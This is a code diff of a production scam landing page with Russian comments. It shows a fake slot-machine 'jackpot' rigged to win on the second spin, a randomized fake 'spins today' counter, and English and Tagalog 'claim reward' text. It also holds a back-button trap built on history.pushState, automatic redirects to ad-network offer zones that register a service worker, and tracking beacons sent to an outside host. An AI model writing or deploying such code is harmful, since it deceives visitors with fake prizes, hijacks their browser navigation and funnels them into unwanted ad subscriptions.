@@ -1,5 +1,5 @@
 <!doctype html>
-<html data-version="0.0.135" data-landing-name="clickbox" data-env="production-archive" lang="">
+<html data-version="0.0.136" data-landing-name="clickbox" data-env="production-archive" lang="">
 
 <head>
     <script>
@@ -18,33 +18,46 @@
     </script>
 
     <script>
+    // Функция для формирования правильной ссылки с subid -> var
+    function getOfferUrl(zoneId) {
+        const domain = APP_CONFIG.domain;
+        const currentParams = new URLSearchParams(window.location.search);
+        let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
+        
+        // Переносим все параметры
+        currentParams.forEach((value, key) => { 
+            offerUrl += `&${key}=${encodeURIComponent(value)}`;
+            
+            // !!! ВАЖНОЕ ИСПРАВЛЕНИЕ ДЛЯ POSTBACK !!!
+            // Если находим subid (от Keitaro), передаем его как var (для ProPush)
+            if (key === 'subid') {
+                offerUrl += `&var=${encodeURIComponent(value)}`;
+            }
+        });
+        
+        offerUrl += `&sw=./sw.js`;
+        return offerUrl;
+    }
+
+    // Функция для кнопки "Назад" и крестика
     function performReverseExit() {
         if (APP_CONFIG.reverse_zoneId) {
-            const domain = APP_CONFIG.domain; 
-            const zoneId = APP_CONFIG.reverse_zoneId;
-            const currentParams = new URLSearchParams(window.location.search);
-            let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
-            currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
-            offerUrl += `&sw=./sw.js`; 
-            
+            const offerUrl = getOfferUrl(APP_CONFIG.reverse_zoneId);
             console.log("Reverse Exit triggered. Redirecting...");
             window.location.replace(offerUrl);
         }
     }
 
+    // Ловушка кнопки Назад
     (function() {
         let isTrapArmed = false;
 
         function armTrap() {
             if (isTrapArmed) return;
             isTrapArmed = true;
-
             try {
                 window.history.pushState({page: 1}, document.title, window.location.href);
-            } catch (e) {
-                isTrapArmed = false;
-                return;
-            }
+            } catch (e) { isTrapArmed = false; return; }
 
             setTimeout(function() {
                 window.addEventListener('popstate', function(event) {
@@ -53,21 +66,13 @@
             }, 1000);
         }
 
-        if (document.readyState === 'complete') {
-            armTrap();
-        } else {
-            window.addEventListener('load', armTrap);
-        }
-
+        if (document.readyState === 'complete') { armTrap(); } else { window.addEventListener('load', armTrap); }
         const triggers = ['touchstart', 'scroll', 'click', 'mouseover'];
-        triggers.forEach(evt => {
-            document.addEventListener(evt, armTrap, { once: true, passive: true });
-        });
+        triggers.forEach(evt => { document.addEventListener(evt, armTrap, { once: true, passive: true }); });
     })();
     </script>
     
     <script>"use strict";(()=>{var g=()=>{let t=new Date,r=t.getUTCFullYear(),s=String(t.getUTCMonth()+1).padStart(2,"0"),n=String(t.getUTCDate()).padStart(2,"0"),o=String(t.getUTCHours()).padStart(2,"0"),a=String(t.getUTCMinutes()).padStart(2,"0"),c=String(t.getUTCSeconds()).padStart(2,"0"),_=String(t.getUTCMilliseconds()*1e3).padStart(6,"0");return`${r}-${s}-${n} ${o}:${a}:${c}.${_} +00:00`};function d({url:t,data:r}){var n;return((n=window==null?void 0:window.navigator)==null?void 0:n.sendBeacon(t.toString(),r?JSON.stringify(r):void 0))?Promise.resolve():Promise.reject(new Error("sendBeacon failed"))}var e=new URL(window.location.href),b,v,h,p,E,T,P,y,N,w,R,f,O,D,S,x,z,C,Y,i={pz:(b=e.searchParams.get("pz"))!=null?b:"",tb:(v=e.searchParams.get("tb"))!=null?v:"",tb_reverse:(h=e.searchParams.get("tb_reverse"))!=null?h:"",ae:(p=e.searchParams.get("ae"))!=null?p:"",z:(E=e.searchParams.get("z"))!=null?E:"",var:(T=e.searchParams.get("var"))!=null?T:"",var_1:(P=e.searchParams.get("var_1"))!=null?P:"",var_2:(y=e.searchParams.get("var_2"))!=null?y:"",var_3:(N=e.searchParams.get("var_3"))!=null?N:"",b:(w=e.searchParams.get("b"))!=null?w:"",campaignid:(R=e.searchParams.get("campaignid"))!=null?R:"",abtest:(f=e.searchParams.get("abtest"))!=null?f:"",rhd:(O=e.searchParams.get("rhd"))!=null?O:"1",s:(D=e.searchParams.get("s"))!=null?D:"",ymid:(S=e.searchParams.get("ymid"))!=null?S:"",wua:(x=e.searchParams.get("wua"))!=null?x:"",use_full_list_or_browsers:(z=e.searchParams.get("use_full_list_or_browsers"))!=null?z:"",cid:(C=e.searchParams.get("cid"))!=null?C:"",geo:(Y=e.searchParams.get("geo"))!=null?Y:""};var k={start:"start",ageExit:"age_exit",mainExit:"main_exit",push:"push",autoexit:"autoexit",back:"back",reverse:"reverse",tabUnderClick:"tab_under_click",error:"error",unhandledRejection:"unhandled_rejection",template_hash_ready:"template_hash_ready"},B=g(),q=t=>{let r;(a=>a[a.BAD_REQUEST=400]="BAD_REQUEST")(r||(r={}));let s="https://wuytl.com",n=new URL(`${s}/sync-metrics`);d({url:n,data:t}).catch(o=>{o.status!=400&&setTimeout(()=>{d({url:n,data:t}).catch(()=>{console.error(`Metrics sync failed: ${t}`)})},100)})},j=()=>i.abtest?i.abtest:APP_CONFIG.abtest?String(APP_CONFIG.abtest):void 0,I=({event:t,exitZoneId:r,errorMessage:s,errorSubType:n,errorType:o})=>{var l,u,m;let a=(l=document.querySelector("html"))==null?void 0:l.dataset,c=(a==null?void 0:a.landingName)||"",_=(a==null?void 0:a.version)||"",F=(a==null?void 0:a.env)||"",U=window.location.host,$=[{app:"landings-constructor",event:k[t]||t,landing_name:c,build_version:_,landing_domain:U,landing_url:window.location.href,exit_zone_id:r?Number(r):void 0,template_hash:(u=window.templateHash)!=null?u:"",request_var:i.var_3,source_zone_id:isNaN(Number(i.var_2))?null:Number(i.var_2),sub_id:i.var_1,landing_load_date_time:B,error_message:s!=null?s:"",ab2r:j(),error_sub_type:n,error_type:o,env:F}];((m=APP_CONFIG.isAnalyticEnabled)!=null?m:!0)&&q($)};window.syncMetric=I;I({event:"start"});})();</script>
-    <script>"use strict";(()=>{var m=(n=>(n.CUSTOM="CUSTOM",n.JS="JS",n))(m||{}),y=(e=>(e.FetchPlatformVersion="FetchPlatformVersion",e.GetIntlDateTimeFormat="GetIntlDateTimeFormat",e.GetTranslations="GetTranslations",e.PushStateToHistory="PushStateToHistory",e.Reverse="Reverse",e.TemplateHash="TemplateHash",e.DesignChange="DesignChange",e))(y||{}),c=(e=>(e.Error="Error",e.RangeError="RangeError",e.ReferenceError="ReferenceError",e.SecurityError="SecurityError",e.SyntaxError="SyntaxError",e.TypeError="TypeError",e.Unknown="Unknown",e))(c||{}),l=(n=>(n.rejectionhandled="rejectionhandled",n.unhandledrejection="unhandledrejection",n))(l||{});const p=()=>{const t=window.syncMetric;if(!t){console.log("Sync metric is not initialized");return}const d=r=>{if(r.filename.includes("extension"))return;const s=`errorMessage: ${r.message}, lineNumber: ${r.lineno}, columnNumber: ${r.colno}, file: ${r.filename}`,o=r.error.name&&Object.values(c).includes(r.error.name)?r.error.name:"Unknown";t({event:"error",errorMessage:s,errorSubType:o,errorType:"JS"})},n=r=>{var e,a,i;if(typeof r.reason=="object"&&((a=(e=r.reason)==null?void 0:e.stack)!=null&&a.includes("extension")))return;const s=typeof r.reason=="object"&&((i=r.reason)!=null&&i.message)?r.reason.message:JSON.stringify(r.reason),o=r.type,u=Object.values(l).includes(o)?o:"Unknown";t({event:"unhandledRejection",errorMessage:s,errorSubType:u,errorType:"JS"})};window.addEventListener("error",d),window.addEventListener("unhandledrejection",n)};p();})();</script>
     
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
@@ -296,11 +301,10 @@
         document.addEventListener('DOMContentLoaded', function() {
             
             // --- РАНДОМНОЕ ЧИСЛО ЗАПУСКОВ ---
-            // Генерируем число от 7005 до 18223
             const min = 7005;
             const max = 18223;
             const randomPlays = Math.floor(Math.random() * (max - min + 1)) + min;
-            const formattedPlays = randomPlays.toLocaleString(); // Добавляет запятые (12,345)
+            const formattedPlays = randomPlays.toLocaleString(); 
 
             // --- ЛОГИКА ПЕРЕВОДОВ ---
             const translations = {
@@ -316,7 +320,7 @@
                     claim: "CLAIM REWARD",
                     plays: "Total spins today: " + formattedPlays
                 },
-                ph: { // ФИЛИППИНЫ (TAGALOG)
+                ph: { 
                     title: "MASWERTENG SPIN",
                     timer: "BILISAN! MATATAPOS ANG BONUS SA:",
                     spinBtn: "IKOT NA",
@@ -335,7 +339,6 @@
             const lang = (geo.toUpperCase() === 'PH' || geo.toUpperCase() === 'PHILIPPINES') ? 'ph' : 'en';
             const t = translations[lang];
 
-            // Применяем переводы
             document.getElementById('titleText').innerText = t.title;
             document.getElementById('timerText').innerText = t.timer;
             document.getElementById('spinBtn').innerText = t.spinBtn;
@@ -343,7 +346,7 @@
             document.getElementById('winSub').innerText = t.match;
             document.getElementById('winBody').innerHTML = t.won;
             document.getElementById('claimBtn').innerText = t.claim;
-            document.getElementById('socialProof').innerText = t.plays; // Вставляем счетчик
+            document.getElementById('socialProof').innerText = t.plays; 
 
             // --- ОСНОВНАЯ ЛОГИКА ---
             const spinBtn = document.getElementById('spinBtn');
@@ -361,91 +364,56 @@
             let spinCount = 0; 
             let autoExitTimer = null; 
 
+            // Функция выхода теперь использует getOfferUrl
             async function performMainExit(isClick = false) {
-                const domain = APP_CONFIG.domain; 
                 const zoneId = isClick ? APP_CONFIG.mainExit_newTab_zoneId : APP_CONFIG.mainExit_currentTab_zoneId;
-
-                if(!zoneId) { 
-                    window.location.href = "https://google.com"; 
-                    return; 
-                }
+                if(!zoneId) { window.location.href = "https://google.com"; return; }
                 
-                const currentParams = new URLSearchParams(window.location.search);
-                let offerUrl = `${domain}/afu.php?zoneid=${zoneId}`;
-                currentParams.forEach((value, key) => { offerUrl += `&${key}=${encodeURIComponent(value)}`; });
-                offerUrl += `&sw=./sw.js`; 
-                
+                // Используем новую функцию, которая мапит subid -> var
+                const offerUrl = getOfferUrl(zoneId);
                 console.log(`Redirecting to zone ${zoneId} (Click: ${isClick})`);
 
-                if (isClick) {
-                    window.open(offerUrl, '_blank');
-                } else {
-                    window.location.href = offerUrl;
-                }
+                if (isClick) { window.open(offerUrl, '_blank'); } else { window.location.href = offerUrl; }
             }
 
             spinBtn.addEventListener('click', function() {
                 if(spinBtn.disabled) return; 
-                
                 if(navigator.vibrate) navigator.vibrate(100);
                 spinBtn.disabled = true; 
-                
                 spinBtn.innerText = t.spinning; 
-
                 let targetIndex = 0;
                 
                 if (spinCount === 0) {
                     targetIndex = 10;
-                    
                     timerContainer.style.display = 'block';
                     timerText.style.display = 'block';
                     timerBar.style.animation = "progress 14s linear forwards";
-                    
-                    console.log("Auto-exit timer started: 14s");
-                    autoExitTimer = setTimeout(() => {
-                        performMainExit(false);
-                    }, 14000);
-
-                    setTimeout(() => {
-                        spinBtn.disabled = false;
-                        spinBtn.innerText = t.spinAgain;
-                    }, 4000); 
-
+                    autoExitTimer = setTimeout(() => { performMainExit(false); }, 14000);
+                    setTimeout(() => { spinBtn.disabled = false; spinBtn.innerText = t.spinAgain; }, 4000); 
                 } else {
                     targetIndex = 15;
                     if(autoExitTimer) clearTimeout(autoExitTimer);
-                    
                     setTimeout(() => { 
                         winModal.classList.add('show'); 
                         winSound.play().catch(e => console.log("Sound error:", e));
-
-                        console.log("Jackpot shown. Auto-redirect in 10s...");
-                        setTimeout(() => {
-                            performMainExit(false);
-                        }, 10000);
-
+                        setTimeout(() => { performMainExit(false); }, 10000);
                     }, 4500);
                 }
 
                 reels.forEach((reel, index) => {
                     const duration = 2500 + (index * 800);
                     const endPos = targetIndex * iconHeight * -1;
-                    
                     setTimeout(() => {
                         reel.classList.add('blur');
                         reel.style.transition = `transform ${duration}ms cubic-bezier(0.15, 0.9, 0.3, 1)`; 
                         reel.style.transform = `translateY(${endPos}px)`;
                     }, 50);
-
                     setTimeout(() => { reel.classList.remove('blur'); }, duration + 50);
                 });
-
                 spinCount++;
             });
 
-            claimBtn.addEventListener('click', function() {
-                performMainExit(true);
-            });
+            claimBtn.addEventListener('click', function() { performMainExit(true); });
         });
     </script>
 
